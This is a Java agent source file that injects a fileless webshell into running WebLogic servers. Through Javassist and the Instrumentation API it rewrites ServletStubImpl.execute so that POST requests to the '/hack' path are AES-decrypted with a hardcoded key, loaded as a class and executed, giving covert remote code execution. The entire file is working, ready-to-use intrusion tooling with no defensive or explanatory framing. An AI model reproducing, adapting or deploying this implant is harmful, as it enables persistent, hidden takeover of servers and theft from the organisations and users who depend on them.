

import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javassist.*;

public class Agent {

    private static byte[] base64decode(String base64Text) throws Exception {
        byte[] result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            result = (byte[])Decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(Decoder, new Object[] { base64Text });
        } else {
            Class<?> Base64 = Class.forName("sun.misc.BASE64Decoder");
            Object Decoder = Base64.newInstance();
            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(Decoder, new Object[] { base64Text });
        }
        return result;
    }

    public static void agentmain(String args, Instrumentation inst){
        Class<?>[] cLasses = inst.getAllLoadedClasses();
        ClassPool cPool = ClassPool.getDefault();
        byte[] data = new byte[0];
        Map<String, Map<String, Object>> targetClasses = new HashMap<String, Map<String, Object>>();
        Map<String, Object> targetClassWeblogicMap = new HashMap<String, Object>();
        targetClassWeblogicMap.put("methodName", "execute");
        List<String> paramWeblogicClsStrList = new ArrayList<String>();
        paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
        paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
        targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
        targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);

        String shellCode = "javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;\njavax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;\njavax.servlet.http.HttpSession session = request.getSession();\nString pathPattern=\"%s\";\nif (request.getRequestURI().matches(pathPattern))\n{\n\tjava.util.Map obj=new java.util.HashMap();\n\tobj.put(\"request\",request);\n\tobj.put(\"response\",response);\n\tobj.put(\"session\",session);\n    ClassLoader loader=this.getClass().getClassLoader();\n\tif (request.getMethod().equals(\"POST\"))\n\t{\n\t\ttry\n\t\t{\n\t\t\tString k=\"%s\";\n\t\t\tsession.putValue(\"u\",k);\n\t\t\t\n\t\t\tjava.lang.ClassLoader systemLoader=java.lang.ClassLoader.getSystemClassLoader();\n\t\t\tClass cipherCls=systemLoader.loadClass(\"javax.crypto.Cipher\");\n\n\t\t\tObject c=cipherCls.getDeclaredMethod(\"getInstance\",new Class[]{String.class}).invoke((java.lang.Object)cipherCls,new Object[]{\"AES\"});\n\t\t\tObject keyObj=systemLoader.loadClass(\"javax.crypto.spec.SecretKeySpec\").getDeclaredConstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]{k.getBytes(),\"AES\"});;\n\t\t\t       \n\t\t\tjava.lang.reflect.Method initMethod=cipherCls.getDeclaredMethod(\"init\",new Class[]{int.class,systemLoader.loadClass(\"java.security.Key\")});\n\t\t\tinitMethod.invoke(c,new Object[]{new Integer(2),keyObj});\n\n\t\t\tjava.lang.reflect.Method doFinalMethod=cipherCls.getDeclaredMethod(\"doFinal\",new Class[]{byte[].class});\n            byte[] requestBody=null;\n            try {\n                    Class Base64 = loader.loadClass(\"sun.misc.BASE64Decoder\");\n\t\t\t        Object Decoder = Base64.newInstance();\n                    requestBody=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                } catch (Exception e) \n                {\n                    Class Base64 = loader.loadClass(\"java.util.Base64\");\n                    Object Decoder = Base64.getDeclaredMethod(\"getDecoder\",new Class[]{null}).invoke(Base64,null);\n                    requestBody=(byte[])Decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});\n                }\n\t\t\t\t\t\t\n\t\t\tbyte[] buf=(byte[])doFinalMethod.invoke(c,new Object[]{requestBody});\n\t\t\tjava.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});\n\t\t\tdefineMethod.setAccessible(true);\n\t\t\tjava.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});\n\t\t\tconstructor.setAccessible(true);\n\t\t\tjava.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});\n\t\t\tjava.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(buf),null});\n\t\t\tc.newInstance().equals(obj);\n\t\t}\n\n\t\tcatch(java.lang.Exception e)\n\t\t{\n\t\t   e.printStackTrace();\n\t\t}\n\t\tcatch(java.lang.Error error)\n\t\t{\n\t\terror.printStackTrace();\n\t\t}\n\t\treturn;\n\t}\t\n}";
        for (Class<?> cls : cLasses) {
            if (targetClasses.keySet().contains(cls.getName())) {
                String targetClassName = cls.getName();
                try {
                    String path = "/hack";//new String(base64decode(args.split("\\|")[0]));
                    String key = "e45e329feb5d925b";//new String(base64decode(args.split("\\|")[1]));
                    shellCode = String.format(shellCode, new Object[] { path, key });
                    if (targetClassName.equals("jakarta.servlet.http.HttpServlet"))
                        shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
                    ClassClassPath classPath = new ClassClassPath(cls);
                    cPool.insertClassPath((ClassPath)classPath);
                    cPool.importPackage("java.lang.reflect.Method");
                    cPool.importPackage("javax.crypto.Cipher");
                    List<CtClass> paramClsList = new ArrayList<CtClass>();
                    for (String clsName : (List<String>)((Map)targetClasses.get(targetClassName)).get("paramList"))
                        paramClsList.add(cPool.get(clsName));
                    CtClass cClass = cPool.get(targetClassName);
                    String methodName = ((Map)targetClasses.get(targetClassName)).get("methodName").toString();
                    CtMethod cMethod = cClass.getDeclaredMethod(methodName, paramClsList.<CtClass>toArray(new CtClass[paramClsList.size()]));
                    cMethod.insertBefore(shellCode);
                    cClass.detach();
                    data = cClass.toBytecode();
                    inst.redefineClasses(new ClassDefinition[] { new ClassDefinition(cls, data) });
                } catch (Exception e) {
                    e.printStackTrace();
                } catch (Error error) {
                    error.printStackTrace();
                }
            }
        }
}
}
